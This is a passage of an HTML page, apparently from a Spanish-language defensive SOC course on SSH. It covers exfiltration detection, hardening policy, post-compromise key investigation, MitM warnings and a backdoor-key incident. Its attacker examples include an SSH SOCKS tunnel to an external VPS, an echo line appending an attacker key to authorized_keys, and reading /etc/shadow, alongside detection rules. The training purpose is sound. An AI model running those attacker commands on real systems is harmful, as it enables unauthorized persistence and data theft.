+  → orig_bytes >> resp_bytes: la workstation ENVÍA 312MB y 198MB
+  → Esto parece dynamic forwarding / SOCKS proxy o exfiltración directa
+
+ESCENARIO MÁS PROBABLE:
+  mgarcia tiene: ssh -D 1080 user@34.122.87.5
+  → Todo el tráfico del browser va por el VPS externo
+  → Los 312MB son tráfico de Internet rutado por su VPS (shadow IT)
+  → O está exfiltrando archivos: rsync/scp vía estos VPS
+
+RED FLAGS:
+  1. SSH a VPS externos no corporativos = posible shadow IT o exfiltración
+  2. 3 conexiones SSH simultáneas por 2 horas = patrón anómalo
+  3. orig_bytes ×150 sobre resp_bytes = data exiting, not downloading
+
+ACCIONES:
+  1. Entrevistar a mgarcia: ¿para qué usa esos VPS?
+  2. Revisar si tiene data clasificada en su workstation
+  3. Correlacionar con DLP: ¿hubo alertas de acceso a archivos sensibles antes?
+  4. Política: SSH saliente a IPs no corporativas debería requerir aprobación
+  5. Si no hay justificación legítima → incidente de posible exfiltración
+
+REGLA SUGERIDA EN SIEM:
+  Alerta: SSH OUTBOUND a IP no en whitelist corporativa + orig_bytes > 10MB
+  → Requiere aprobación de manager o IR
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-03</span>
+            <span class="ejercicio-title" data-i18n="ssh.ej3.title">Diseñar política SSH segura para la empresa</span>
+            <span class="ejercicio-difficulty dif-medium" data-i18n="ej.medium">Medio</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="ssh.ej3.q">La empresa tiene 50 servidores Linux accesibles por SSH desde Internet. El equipo de seguridad te pide diseñar la política SSH. ¿Qué configuraciones, controles y monitoreo implementás?</p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box">
+POLÍTICA SSH EMPRESARIAL — NIVEL MÍNIMO ACEPTABLE:
+
+1. ACCESO SOLO POR VPN / BASTION HOST:
+   → TCP/22 bloqueado en firewall perimetral para IPs públicas
+   → Solo acceso via VPN corporativa → SSH interno
+   → O bastion host con IP fija (jump server): ssh -J bastion servidor
+   → Reducción de superficie de ataque: de Internet → de VPN
+
+2. AUTENTICACIÓN:
+   → PasswordAuthentication no  (clave pública OBLIGATORIA)
+   → PermitRootLogin no
+   → MFA adicional con AuthenticationMethods publickey,keyboard-interactive
+   → Centralizar authorized_keys: Ansible gestiona claves, no manualmente
+
+3. ACCESO POR ROLES:
+   → Grupo 'sysadmin': acceso a todos los servidores con su clave personal
+   → Grupo 'deploy': acceso solo a servidores de app, sin shell (ForceCommand)
+   → Grupo 'monitoring': solo sftp, no shell
+   → AllowGroups sysadmin deploy monitoring
+
+4. GESTIÓN DE CLAVES:
+   → Rotación de claves cada 12 meses
+   → Inventario centralizado de authorized_keys (Ansible/Chef)
+   → Alerta: modificación de authorized_keys fuera de ventana de cambios
+   → Al offboarding: remoción inmediata de clave del empleado
+
+5. HARDENING sshd_config:
+   PasswordAuthentication no
+   PermitRootLogin no
+   AllowGroups sysadmin deploy monitoring
+   LoginGraceTime 20
+   MaxAuthTries 3
+   LogLevel VERBOSE
+   AllowTcpForwarding no  # habilitar solo con justificación
+   X11Forwarding no
+   Banner /etc/ssh/banner.txt  # aviso legal
+
+6. MONITOREO:
+   → Centralizar auth.log en SIEM (rsyslog/Filebeat → Elasticsearch)
+   → Alertas:
+     - Fail: >5 intentos desde misma IP en 60s → medium
+     - Nuevo país para usuario conocido → high
+     - Login fuera de horario laboral (22:00-06:00) → medium
+     - Login como usuario de servicio (deploy, backup) desde IP externa → high
+     - Modificación de authorized_keys → high
+
+7. FAIL2BAN:
+   maxretry = 5
+   findtime = 600
+   bantime = 3600  (o permanente con recidiva)
+   ignoreip = 10.0.0.0/8 (VPN)
+
+8. AUDITORÍA:
+   → Sesiones SSH grabadas con ttyrec o teleport.sh para compliance
+   → Revisión trimestral de authorized_keys (quién tiene acceso a qué)
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-04</span>
+            <span class="ejercicio-title" data-i18n="ssh.ej4.title">Identificar claves SSH robadas post-compromise</span>
+            <span class="ejercicio-difficulty dif-hard" data-i18n="ej.hard">Difícil</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="ssh.ej4.q">Un servidor fue comprometido vía una webshell. El atacante tuvo acceso durante 20 minutos antes de ser detectado. ¿Qué pasos seguís para determinar si robó claves SSH y si hay persistencia?</p>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box">
+INVESTIGACIÓN POST-COMPROMISE — CLAVES SSH:
+
+PASO 1: DETERMINAR QUÉ CLAVES EXISTÍAN Y SI FUERON ACCEDIDAS
+
+En el servidor comprometido:
+  # Inventario de claves privadas
+  find / -name "id_*" -not -name "*.pub" 2>/dev/null
+  find / -name "*.pem" -o -name "*.key" 2>/dev/null
+
+  # Ver timestamps de acceso a las claves
+  stat ~/.ssh/id_rsa ~/.ssh/id_ed25519
+  ls -la --time=atime ~/.ssh/
+  → Si el "access time" de id_rsa coincide con la ventana de compromiso → fue leída
+
+  # Verificar en audit log si las claves fueron leídas
+  ausearch -f /root/.ssh/id_rsa
+  ausearch -f /home/admin/.ssh/id_ed25519
+
+PASO 2: ¿SE AGREGARON CLAVES A authorized_keys?
+
+  # Ver authorized_keys de todos los usuarios
+  for user in $(cut -d: -f1 /etc/passwd); do
+    if [ -f /home/$user/.ssh/authorized_keys ]; then
+      echo "=== $user ===" && cat /home/$user/.ssh/authorized_keys
+    fi
+  done
+
+  # Comparar con backup / Ansible último estado conocido
+  git diff HEAD /home/admin/.ssh/authorized_keys
+  → Clave nueva = backdoor del atacante
+
+  # Ver cuándo fue modificado authorized_keys
+  stat /home/admin/.ssh/authorized_keys
+  ls -la --time=mtime /home/*/.ssh/
+
+PASO 3: VERIFICAR LOGINS POST-COMPROMISO EN OTROS SERVIDORES
+
+  # En el SIEM: buscar logins SSH exitosos con la clave robada
+  # Si la clave de este servidor era para prod-db-01, prod-api-02...
+  # → Buscar logins en esos servidores con fingerprint de esa clave
+
+  grep "prod-server-01" /var/log/auth.log | grep "Accepted publickey"
+  # Ver fingerprint de la clave usada
+  → Comparar con la clave robada (ssh-keygen -lf id_rsa.pub)
+
+PASO 4: ACCIONES DE CONTENCIÓN
+
+  1. Invalidar TODAS las claves privadas del servidor comprometido:
+     Generar nuevas claves para todos los usuarios afectados
+     Actualizar authorized_keys en todos los servidores destino
+
+  2. Revocar la clave pública robada de TODOS los servidores:
+     ansible all -m authorized_key -a "user=admin state=absent key='ssh-rsa AAAA...'"
+
+  3. Revisar authorized_keys en TODOS los servidores (no solo el comprometido)
+     Buscar la clave nueva que el atacante agregó y removerla
+
+  4. Auditoría completa: ¿los servidores destino tienen logs de acceso?
+     Si la clave fue usada antes de la detección → revisar esos servidores también
+
+REGLA PREVENTIVA:
+  Monitorear con inotifywait o auditd: cualquier escritura a authorized_keys
+  → Alertar en tiempo real, no descubrirlo 20min después
+            </div>
+          </div>
+        </div>
+
+        <div class="ejercicio-card">
+          <div class="ejercicio-header">
+            <span class="ejercicio-number">EJ-05</span>
+            <span class="ejercicio-title" data-i18n="ssh.ej5.title">Interpretar el host key — ¿ataque MitM?</span>
+            <span class="ejercicio-difficulty dif-medium" data-i18n="ej.medium">Medio</span>
+          </div>
+          <div class="ejercicio-body">
+            <p data-i18n="ssh.ej5.q">Un desarrollador recibe esta advertencia de SSH. ¿Qué significa? ¿Es siempre un ataque? ¿Qué debe hacer?</p>
+            <pre>
+$ ssh admin@prod-server-01.empresa.com
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!   @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
+Someone could be eavesdropping on you right now (man-in-the-middle attack)!
+It is also possible that a host key has just been changed.
+The fingerprint for the ED25519 key sent by the remote host is:
+SHA256:xYz+AbCdEfGhIjKlMnOpQrStUvWxYz1234567890abcde/fg=
+Please contact your system administrator.
+Add correct host key in /home/dev/.ssh/known_hosts to get rid of this message.
+Offending ED25519 key in /home/dev/.ssh/known_hosts:47
+Host prod-server-01.empresa.com not in list of HostkeyAlgorithms
+Host key verification failed.</pre>
+            <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver respuesta</button>
+            <div class="respuesta-box">
+QUÉ SIGNIFICA:
+  SSH detectó que la clave pública del servidor prod-server-01 cambió.
+  La clave que presenta el servidor HOY es diferente a la que estaba
+  en ~/.ssh/known_hosts cuando se conectó por primera vez.
+
+CAUSAS POSIBLES (no necesariamente maliciosas):
+
+  CAUSA 1: El servidor fue reinstalado / reimaged
+  → Al reinstalar el OS, se regeneran las host keys de SSH
+  → Muy común en cloud (nueva instancia, nuevo IP, nuevo AMI)
+  → También pasa al clonar una VM
+
+  CAUSA 2: El admin cambió manualmente las host keys
+  → Para rotación de seguridad o migración
+
+  CAUSA 3: ATAQUE REAL: Man-in-the-Middle
+  → Alguien interceptó la conexión y presenta su propia clave
+  → El atacante puede leer/modificar toda la sesión SSH
+  → Más probable en WiFi pública o si hay ARP spoofing en la red
+
+CÓMO DETERMINAR SI ES LEGÍTIMO O ATAQUE:
+
+  1. Verificar por otro canal seguro:
+     → Llamar/mensajear al admin del servidor: "¿reinstalaron prod-server-01?"
+     → Revisar tickets de cambio: ¿hay un change request de rebuild?
+     → Revisar en la consola del cloud (AWS/Azure/GCP) la fingerprint actual
+
+  2. Comparar fingerprints:
+     → La que muestra SSH: SHA256:xYz+AbCdEfGhIjKlMnOpQrStUvWxYz...
+     → La real del servidor (vía consola del cloud o acceso físico):
+       ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub
+
+  3. Si las fingerprints coinciden y fue reinstalado = actualizar known_hosts:
+     ssh-keygen -R prod-server-01.empresa.com
+     → Reconectar y verificar la nueva huella
+
+LO QUE NUNCA DEBE HACER:
+  ❌ Editar /etc/hosts o known_hosts para "saltarse" la verificación sin confirmar
+  ❌ Usar StrictHostKeyChecking=no (desactiva la verificación completamente)
+  ❌ Conectarse de todas formas sin verificar → si es MitM, el atacante tiene su sesión
+
+CONCLUSIÓN: Esta alerta es el mecanismo defensivo de SSH funcionando correctamente.
+  Si no hay una causa conocida, tratarlo como posible MitM hasta confirmar lo contrario.
+            </div>
+          </div>
+        </div>
+
+        <!-- Mini Challenge -->
+        <div class="mini-challenge">
+          <div class="challenge-label" data-i18n="ej.challenge">🚨 Mini-Challenge · Resolver el incidente</div>
+          <h3 data-i18n="ssh.challenge.title">Incidente #SSH-001: "El backdoor silencioso"</h3>
+          <p style="color:var(--text-secondary);font-size:0.9rem;margin-bottom:1rem;" data-i18n="ssh.challenge.ctx">
+            Viernes 18:00. El analista de turno nota una alerta baja: login SSH exitoso en prod-api-01 desde IP de Países Bajos (85.214.x.x). El usuario es "buildbot" — cuenta de CI/CD. El acceso duró 4 segundos. No hay alerta de brute force previo. El equipo de infraestructura no realizó ningún deploy.
+          </p>
+          <pre style="font-size:0.78rem;margin-bottom:1rem;" data-i18n="ssh.pre10">
+auth.log:
+  Fri Jun 20 18:00:11 prod-api-01 sshd: Accepted publickey for buildbot
+    from 85.214.143.22 port 59900 ssh2 RSA SHA256:newFP/xyz+abc...
+  Fri Jun 20 18:00:15 prod-api-01 sshd: session closed for user buildbot
+
+Contexto:
+  - buildbot solo se conecta desde Jenkins CI (10.0.5.10) con la clave RSA SHA256:legitFP/ABC...
+  - El fingerprint del login es SHA256:newFP/xyz+abc... (DISTINTO al legítimo)
+  - 4 segundos — demasiado poco para un deploy real
+  - El CI/CD de Jenkins no tiene ningún job activo a las 18:00</pre>
+          <div class="ejercicio-card" style="border-color:var(--proto-color);margin-top:0;">
+            <div class="ejercicio-header">
+              <span class="ejercicio-number">CHALLENGE</span>
+              <span class="ejercicio-title" data-i18n="ssh.challenge.q">¿Qué ocurrió y cómo respondés?</span>
+              <span class="ejercicio-difficulty dif-hard" data-i18n="ej.hard">Difícil</span>
+            </div>
+            <div class="ejercicio-body">
+              <button class="respuesta-toggle" data-i18n="btn.showAnswer">🔍 Ver análisis completo</button>
+              <div class="respuesta-box">
+QUÉ OCURRIÓ: Backdoor SSH — clave no autorizada agregada a authorized_keys
+
+ANÁLISIS DE LA EVIDENCIA:
+  1. Fingerprint diferente:
+     Legítimo: SHA256:legitFP/ABC... (Jenkins CI, IP 10.0.5.10)
+     El acceso: SHA256:newFP/xyz+abc... (IP holandesa, 85.214.143.22)
+     → Alguien agregó su propia clave pública a /home/buildbot/.ssh/authorized_keys
+
+  2. IP holandesa: 85.214.143.22
+     → No está en ninguna lista de IPs corporativas
+     → Probable VPS/servidor del atacante (Hetzner, common con atacantes EU)
+
+  3. Solo 4 segundos de sesión
+     → Comando rápido: probablemente solo para verificar que el backdoor funciona
+     → O para ejecutar un script de reconocimiento: whoami, hostname, cat /etc/shadow
+     → Muy parecido a un "beacon check" de C2
+
+  4. Sin brute force previo → el atacante YA tenía la clave
+     → La clave fue instalada en un ataque PREVIO que aún no detectamos
+
+VECTOR DE ATAQUE (hipótesis principal):
+  El atacante comprometió el servidor Jenkins (10.0.5.10) anteriormente.
+  Desde Jenkins, ejecutó un job malicioso o aprovechó acceso existente para:
+    echo "ssh-rsa AAAA...attackerkey..." >> /home/buildbot/.ssh/authorized_keys
+  en prod-api-01 (que buildbot ya tenía acceso legítimo)
+
+ACCIONES INMEDIATAS (T+0):
+  1. Aislar prod-api-01: no apagar aún (preservar evidencia), pero bloquear nueva red entrante
+     iptables -A INPUT -p tcp --dport 22 -j DROP  (excepto desde IPs de IR)
+
+  2. Preservar estado:
+     ps auxwww > /tmp/processes.txt
+     ss -tulnp > /tmp/connections.txt
+     find /home/buildbot/.ssh/ -ls
+     cat /home/buildbot/.ssh/authorized_keys
+
+  3. Remover el backdoor:
+     # Identificar y eliminar la clave maliciosa de authorized_keys
+     grep -v "newFP" /home/buildbot/.ssh/authorized_keys > /tmp/clean_keys
+     mv /tmp/clean_keys /home/buildbot/.ssh/authorized_keys
+
+  4. Bloquear 85.214.143.22 en todos los firewalls
+
+INVESTIGACIÓN AMPLIADA (T+1h):
+  5. Auditar Jenkins (10.0.5.10) — ¿cómo se agregó la clave?
+     → Revisar build logs, historial de jobs
+     → Ver si alguien modificó un Jenkinsfile o script de deploy
+     → ¿Hay otras claves no autorizadas en otros servidores que buildbot accede?
+
+  6. Correlacionar en SIEM:
+     → ¿Cuándo se modificó authorized_keys en prod-api-01?
+     → ¿Hubo otros logins de la misma clave (newFP) en otros servidores?
+     → ¿La IP 85.214.143.22 aparece en otros logs?
+
+  7. Scope: ¿Cuántos servidores tiene acceso buildbot?
+     → Revisar authorized_keys en TODOS esos servidores
+
+LECCIONES:
+  1. Alertar sobre CUALQUIER login SSH con fingerprint no registrado en CMDB
+  2. Monitorear authorized_keys con auditd o inotifywait — cambios = alerta inmediata
+  3. buildbot no debería poder instalar su propia clave — gestión centralizada de claves
+  4. El CI/CD (Jenkins) es un objetivo de alto valor — credenciales para acceder a TODOS los servers
+  5. Alertas de "baja severidad" como esta pueden ser los indicios de un ataque mayor
+              </div>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </div><!-- /tab ejercicios -->
+
+    <!-- ── Tab: Recursos ── -->
+    <div class="tab-content" data-tab="recursos">
+
+      <div class="section-title" data-i18n="rec.official">📄 Documentación Oficial</div>
+      <div class="recursos-grid mb-3">
+        <div class="recurso-card">
+          <div class="recurso-type">RFC</div>
+          <h4>RFC 4251-4254 — SSH Protocol Architecture</h4>
+          <a class="recurso-link" href="https://www.rfc-editor.org/rfc/rfc4251" target="_blank" rel="noopener">→ rfc-editor.org/rfc/rfc4251</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">Docs</div>
+          <h4>OpenSSH — Manual sshd_config</h4>
+          <a class="recurso-link" href="https://man.openbsd.org/sshd_config" target="_blank" rel="noopener">→ man.openbsd.org/sshd_config</a>
+        </div>
+      </div>
+
+      <div class="section-title" data-i18n="rec.tools">🛠️ Herramientas SOC</div>
+      <div class="recursos-grid mb-3">
+        <div class="recurso-card">
+          <div class="recurso-type" data-i18n="rec.type.detection.zeek">Detección · Zeek</div>
+          <h4>Zeek ssh.log — campos y consultas</h4>
+          <pre style="font-size:0.78rem;margin-top:0.5rem;"># Brute force
+zeek-cut ts id.orig_h auth_success < ssh.log \
+  | awk '$3=="false"' | sort | uniq -c | sort -rn
+
+# Sesiones largas (posible tunneling)
+zeek-cut id.orig_h id.resp_h duration orig_bytes < ssh.log \
+  | awk '$3 > 3600 && $4 > 50000000'
+
+# Logins exitosos desde externas
+zeek-cut id.orig_h auth_success < ssh.log \
+  | awk '$2=="true" && $1 !~ /^10\./ && $1 !~ /^192\.168/'</pre>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">Hardening · fail2ban</div>
+          <h4 data-i18n="ssh.rec.fail2ban">Fail2ban para SSH</h4>
+          <pre style="font-size:0.78rem;margin-top:0.5rem;"># /etc/fail2ban/jail.local
+[sshd]
+enabled = true
+port    = ssh
+logpath = /var/log/auth.log
+maxretry = 5
+findtime = 600
+bantime  = 3600
+# Ban permanente en reincidentes:
+# bantime.increment = true
+# bantime.multiplier = 2</pre>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">Auditd</div>
+          <h4>Monitorear authorized_keys</h4>
+          <pre style="font-size:0.78rem;margin-top:0.5rem;"># /etc/audit/rules.d/ssh.rules
+-w /root/.ssh/authorized_keys -p wa -k ssh_keys
+-w /home -p wa -k ssh_keys_home
+
+# Consultar eventos
+ausearch -k ssh_keys -ts recent | aureport --file</pre>
+        </div>
+      </div>
+
+      <div class="section-title" data-i18n="rec.cheatsheet">📋 Cheatsheet SSH para SOC</div>
+      <div class="cheatsheet-table-wrap">
+        <table class="cheatsheet-table">
+          <thead>
+            <tr><th data-i18n="cheat.signal">Señal en logs</th><th data-i18n="cheat.attack">Posible ataque/riesgo</th><th data-i18n="cheat.action">Acción</th></tr>
+          </thead>
+          <tbody>
+            <tr><td data-i18n="ssh.cheat.r1a">Múltiples "Failed password" desde misma IP en &lt;60s</td><td>Brute force SSH</td><td data-i18n="ssh.cheat.r1c">Bloquear IP, verificar si hubo éxito</td></tr>
+            <tr><td data-i18n="ssh.cheat.r2a">Accepted publickey con fingerprint no registrado</td><td data-i18n="ssh.cheat.r2b">Clave backdoor instalada</td><td data-i18n="ssh.cheat.r2c">Crítico — auditar authorized_keys en todos los servers</td></tr>
+            <tr><td data-i18n="ssh.cheat.r3a">Login de cuenta de servicio desde IP externa</td><td data-i18n="ssh.cheat.r3b">Clave robada / backdoor</td><td data-i18n="ssh.cheat.r3c">Alto — revocar clave, investigar origen</td></tr>
+            <tr><td data-i18n="ssh.cheat.r4a">Sesión SSH &gt;1h con &gt;50MB de datos salientes</td><td data-i18n="ssh.cheat.r4b">Tunneling / exfiltración</td><td data-i18n="ssh.cheat.r4c">Investigar, correlacionar con DLP</td></tr>
+            <tr><td data-i18n="ssh.cheat.r5a">Login exitoso desde país inusual para el usuario</td><td data-i18n="ssh.cheat.r5b">Cuenta comprometida / impossible travel</td><td data-i18n="ssh.cheat.r5c">Bloquear sesión, contactar usuario, resetear credenciales</td></tr>
+            <tr><td data-i18n="ssh.cheat.r6a">Modificación de ~/.ssh/authorized_keys</td><td data-i18n="ssh.cheat.r6b">Backdoor SSH / persistencia</td><td data-i18n="ssh.cheat.r6c">Alertar inmediatamente, revisar clave nueva</td></tr>
+            <tr><td data-i18n="ssh.cheat.r7a">SSH saliente desde workstation de usuario</td><td data-i18n="ssh.cheat.r7b">Shadow IT / tunneling no autorizado</td><td data-i18n="ssh.cheat.r7c">Investigar destino, política de egress SSH</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="section-title mt-3" data-i18n="rec.labs">🎯 Referencias</div>
+      <div class="recursos-grid">
+        <div class="recurso-card">
+          <div class="recurso-type">MITRE ATT&CK</div>
+          <h4>T1021.004 — Remote Services: SSH</h4>
+          <a class="recurso-link" href="https://attack.mitre.org/techniques/T1021/004/" target="_blank" rel="noopener">→ attack.mitre.org/T1021/004</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">MITRE ATT&CK</div>
+          <h4>T1572 — Protocol Tunneling</h4>
+          <a class="recurso-link" href="https://attack.mitre.org/techniques/T1572/" target="_blank" rel="noopener">→ attack.mitre.org/T1572</a>
+        </div>
+        <div class="recurso-card">
+          <div class="recurso-type">MITRE ATT&CK</div>
+          <h4>T1552.004 — Private Keys</h4>
+          <a class="recurso-link" href="https://attack.mitre.org/techniques/T1552/004/" target="_blank" rel="noopener">→ attack.mitre.org/T1552/004</a>
+        </div>
+      </div>
+
+    </div><!-- /tab recursos -->
+
+  </main>
+
+  <footer class="site-footer">
+    <div class="container">
+      <div class="footer-links">
+        <a href="../ftp/index.html">← FTP</a>
+        <a href="../index.html">Hub</a>
+        <a href="../tls/index.html">TLS →</a>
+      </div>
+      <p data-i18n="footer.license">@xavimape · Uso educativo y defensivo · MIT License</p>
+    </div>
+  </footer>
+
+  <script src="../theme-switcher.js"></script>
+  <script src="../i18n-core.js"></script>
+  <script src="../i18n-ssh.js"></script>
+  <script src="../shared.js"></script>
+  <script src="app.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      SOC.initSlides('ssh-slides');
+      SOC.initEjercicios();
+      SOC.saveProgress('ssh', 'demo');
+    });
+  </script>
+</body>
+</html>
